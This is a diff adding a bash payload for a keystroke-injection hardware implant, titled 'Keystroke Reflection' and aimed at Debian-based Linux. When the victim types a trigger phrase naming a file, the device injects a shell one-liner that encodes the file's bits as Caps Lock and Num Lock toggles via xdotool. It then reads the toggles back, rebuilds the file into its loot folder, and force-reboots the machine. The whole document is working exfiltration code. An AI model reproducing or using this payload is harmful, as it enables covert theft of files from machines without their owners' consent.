@@ -1,0 +1,119 @@
+#!/bin/bash
+#
+# Title:            "Linux" Keystroke Reflection
+# Description:
+#                   Implementation of the 
+#                   "Keystroke Injection" technique 
+#                   for file exfiltration.
+#
+# Author:           TW-D
+# Version:          1.0
+# Target:           Debian-Based Linux Distributions
+# Category:         Exfiltration
+# Attackmode:       HID
+#
+# TESTED ON
+# ===============
+# Ubuntu 22.04.3 LTS with "Logitech Keyboard K120"
+#
+# STATUS
+# ===============
+# Magenta solid ................................... SETUP
+# Yellow single blink ............................. ATTACK
+# Yellow double blink ............................. STAGE2
+# Yellow triple blink ............................. STAGE3
+# White fast blink ................................ CLEANUP
+# Green 1000ms VERYFAST blink followed by SOLID ... FINISH
+#
+
+######## TRIGGER ########
+
+MATCH __kr:file=(.*?)\[ENTER\]
+
+######## INITIALIZATION ########
+
+readonly KR_FILE="$(echo "${LOOT}" | sed 's/\[[^]]*\]//g')"
+readonly KR_BIN="/tmp/keystroke-reflection.bin"
+readonly KEYCROC_LOOT="/root/loot/keystroke-reflection_$(date '+%s')-${RANDOM}"
+
+######## SETUP ########
+
+LED SETUP
+
+export DUCKY_LANG="us"
+
+######## ATTACK ########
+
+LED ATTACK
+
+QUACK STRING " binary_dump=\"\$(xxd -b ${KR_FILE} | cut -d' ' -f2-7)\";"
+QUACK STRING " key_sequence=\"\";"
+QUACK STRING " for ((i=0;i<\"\${#binary_dump}\";i++)); do"
+QUACK STRING " if [ \"\${binary_dump:\$i:1}\" == \"0\" ]; then"
+QUACK STRING " key_sequence+=\"Caps_Lock \";"
+QUACK STRING " elif [ \"\${binary_dump:\$i:1}\" == \"1\" ]; then"
+QUACK STRING " key_sequence+=\"Num_Lock \";"
+QUACK STRING " fi;"
+QUACK STRING " done;"
+QUACK STRING " sleep 3;"
+QUACK STRING " xdotool key --delay 275 \$key_sequence"
+QUACK DELAY 250
+QUACK ENTER
+
+######## STAGE2 ########
+
+LED STAGE2
+
+loop_control="true"
+capslock_state="$(CAPSLOCK_ON)"
+numlock_state="$(NUMLOCK_ON)"
+
+while [ "${loop_control}" == "true" ]; do
+    start_time="$(date '+%s')"
+    while true; do
+        if [ "$(CAPSLOCK_ON)" != "${capslock_state}" ]; then
+            echo -n "0" >> "${KR_BIN}"
+            capslock_state="$(CAPSLOCK_ON)"
+            break
+        elif [ "$(NUMLOCK_ON)" != "${numlock_state}" ]; then
+            echo -n "1" >> "${KR_BIN}"
+            numlock_state="$(NUMLOCK_ON)"
+            break
+        elif [ $(($(date '+%s') - start_time)) -ge 9 ]; then
+            loop_control="false"
+            break
+        fi
+    done
+done
+
+######## STAGE3 ########
+
+LED STAGE3
+
+if [ -f "${KR_BIN}" ]; then
+    for binary in $(cat "${KR_BIN}" | sed 's/\(.\{8\}\)/\1 /g'); do
+        decimal="$((2#${binary}))"
+        hexadecimal="$(printf "%X" "${decimal}")"
+        ascii="$(printf "\\x${hexadecimal}")"
+        echo -en "${ascii}" >> "${KEYCROC_LOOT}"
+    done
+    rm "${KR_BIN}"
+fi
+
+######## CLEANUP ########
+
+LED CLEANUP
+
+sync
+
+######## FINISH ########
+
+LED FINISH
+
+ATTACKMODE OFF
+
+######## OFF ########
+
+LED OFF
+
+reboot --force
